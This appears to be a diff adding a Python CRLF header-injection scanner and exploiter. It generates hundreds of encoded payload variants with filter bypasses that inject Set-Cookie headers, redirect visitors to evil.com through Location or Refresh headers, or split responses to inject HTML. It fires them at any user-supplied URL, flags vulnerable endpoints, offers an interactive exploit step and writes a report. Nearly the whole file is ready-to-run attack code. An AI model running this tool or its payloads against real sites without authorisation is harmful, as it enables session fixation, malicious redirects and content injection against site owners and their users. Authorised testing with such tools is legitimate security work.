@@ -1,0 +1,207 @@
+import requests
+from urllib.parse import quote, unquote
+import re
+from colorama import Fore, Style, init
+import os
+import time
+
+# Initialize colorama
+init(autoreset=True)
+
+def generate_payloads():
+    """Generate payloads with various bypass techniques"""
+    payloads = []
+    
+    # Basic CRLF payloads
+    base_payloads = [
+        "%0d%0aSet-Cookie:injected=1",
+        "%0d%0aLocation:https://evil.com",
+        "%0d%0aX-Test:injected-header",
+        "%0d%0aRefresh:0;url=https://evil.com",
+        "%0d%0aContent-Length:0",
+        "%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>Injected</html>",
+    ]
+    
+    # Advanced bypass techniques
+    bypass_techniques = [
+        "",  # No extra bypass
+        "%23",  # Hash bypass
+        "%3f",  # Question mark bypass
+        "%26",  # Ampersand bypass
+        "%20",  # Space
+        "%09",  # Tab
+        "%0b",  # Vertical tab
+    ]
+    
+    # CRLF representations
+    crlf_variations = [
+        ("%0d%0a", "CRLF"),         # Standard
+        ("%0a%0d", "LFCR"),         # Reverse
+        ("%0a", "LF"),              # Line Feed Only
+        ("%0d", "CR"),              # Carriage Return Only
+        ("%25%30%61", "Double-Encoded LF"),  # %0a encoded
+        ("%25%30%64", "Double-Encoded CR"),  # %0d encoded
+    ]
+    
+    # Generate all combinations
+    for base in base_payloads:
+        for tech in bypass_techniques:
+            for crlf, name in crlf_variations:
+                # Insert bypass before CRLF
+                payload = base.replace("%0d%0a", tech + crlf)
+                payloads.append({
+                    "payload": payload,
+                    "technique": f"{name} + {tech if tech else 'None'}",
+                    "type": base.split(':')[0][5:].capitalize()
+                })
+    
+    return payloads
+
+def check_response(response, payload_type, payload):
+    """Check if injection was successful based on payload type"""
+    payload = unquote(payload).lower()
+    
+    if "set-cookie" in payload_type.lower():
+        cookies = response.headers.get('Set-Cookie', '')
+        if isinstance(cookies, str):
+            cookies = [cookies]
+        return any("injected=1" in cookie.lower() for cookie in cookies)
+    
+    if "location" in payload_type.lower():
+        location = response.headers.get('Location', '')
+        return "evil.com" in location.lower()
+    
+    if "refresh" in payload_type.lower():
+        refresh = response.headers.get('Refresh', '')
+        return "evil.com" in refresh.lower()
+    
+    if "content-type" in payload_type.lower():
+        return "injected" in response.text.lower()
+    
+    # Check for any injected header
+    keywords = ['injected', 'evil.com', 'test']
+    for header, value in response.headers.items():
+        header_str = f"{header}:{value}".lower()
+        if any(kw in header_str for kw in keywords):
+            return True
+    
+    return False
+
+def exploit_vulnerability(url, payload_details):
+    """Demonstrate exploit by showing injected content"""
+    full_url = url + payload_details['payload']
+    print(f"\n{Fore.CYAN}[*] Exploiting: {full_url}")
+    
+    try:
+        response = requests.get(full_url, headers=headers, allow_redirects=False, timeout=10)
+        print(f"{Fore.YELLOW}[*] Response Code: {response.status_code}")
+        
+        print(f"\n{Fore.YELLOW}[*] Response Headers:")
+        keywords = ['injected', 'evil.com', 'test']
+        for header, value in response.headers.items():
+            header_str = f"{header}:{value}".lower()
+            if any(kw in header_str for kw in keywords):
+                print(f"{Fore.GREEN}{header}: {value}")
+            else:
+                print(f"{header}: {value}")
+        
+        if "Content-Type" in payload_details['type']:
+            print(f"\n{Fore.YELLOW}[*] Response Body:")
+            print(response.text[:500] + ("..." if len(response.text) > 500 else ""))
+    
+    except Exception as e:
+        print(f"{Fore.RED}[!] Exploit failed: {str(e)}")
+
+def generate_report(target, payload_details, response):
+    """Generate vulnerability report"""
+    timestamp = time.strftime("%Y%m%d-%H%M%S")
+    filename = f"crlf_report_{timestamp}.txt"
+    
+    report = f"""
+CRLF Injection Vulnerability Report
+===================================
+Report Generated: {time.ctime()}
+Target URL: {target}
+Vulnerable Parameter: file
+
+Vulnerability Details:
+----------------------
+Payload: {unquote(payload_details['payload'])}
+Payload Type: {payload_details['type']}
+Bypass Technique: {payload_details['technique']}
+Response Code: {response.status_code}
+
+Request:
+--------
+GET {target + payload_details['payload']}
+
+Response Headers:
+-----------------
+"""
+    for header, value in response.headers.items():
+        report += f"{header}: {value}\n"
+    
+    report += f"\nResponse Body (first 200 chars):\n{response.text[:200]}"
+    
+    with open(filename, 'w') as f:
+        f.write(report)
+    
+    return filename
+
+# Configuration
+target_url = input("Enter target URL (with vulnerable parameter): ").strip()
+headers = {
+    "User-Agent": "Advanced-CRLF-Scanner/1.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+}
+
+# Generate payloads
+payloads = generate_payloads()
+vulnerable_found = False
+
+print(f"\n{Fore.YELLOW}[*] Starting CRLF injection scan on {target_url}")
+print(f"{Fore.YELLOW}[*] Testing {len(payloads)} payload variations...\n")
+
+for payload_details in payloads:
+    payload = payload_details['payload']
+    full_url = target_url + payload
+    
+    try:
+        response = requests.get(full_url, headers=headers, allow_redirects=False, timeout=10)
+        
+        if check_response(response, payload_details['type'], payload):
+            vulnerable_found = True
+            print(f"{Fore.GREEN}[!] VULNERABLE ENDPOINT: {target_url}")
+            print(f"{Fore.GREEN}[+] Payload: {unquote(payload)}")
+            print(f"{Fore.GREEN}[+] Technique: {payload_details['technique']}")
+            print(f"{Fore.GREEN}[+] Type: {payload_details['type']} injection")
+            print(f"{Fore.GREEN}[+] Status: {response.status_code}")
+            
+            # Show injected headers
+            keywords = ['injected', 'evil.com', 'test']
+            for header, value in response.headers.items():
+                header_str = f"{header}:{value}".lower()
+                if any(kw in header_str for kw in keywords):
+                    print(f"  {Fore.CYAN}{header}: {value}")
+            
+            # Ask for exploitation
+            exploit = input(f"\n{Fore.YELLOW}[?] Exploit this vulnerability? (y/n): ").strip().lower()
+            if exploit == 'y':
+                exploit_vulnerability(target_url, payload_details)
+                
+                # Generate report
+                report = input(f"{Fore.YELLOW}[?] Generate vulnerability report? (y/n): ").strip().lower()
+                if report == 'y':
+                    filename = generate_report(target_url, payload_details, response)
+                    print(f"{Fore.GREEN}[+] Report saved as: {filename}")
+            
+            print("-" * 80)
+    
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error testing payload: {str(e)}")
+        continue
+
+if not vulnerable_found:
+    print(f"{Fore.RED}[-] No CRLF vulnerabilities found")
+else:
+    print(f"{Fore.GREEN}[+] Scan completed. Vulnerabilities found!")
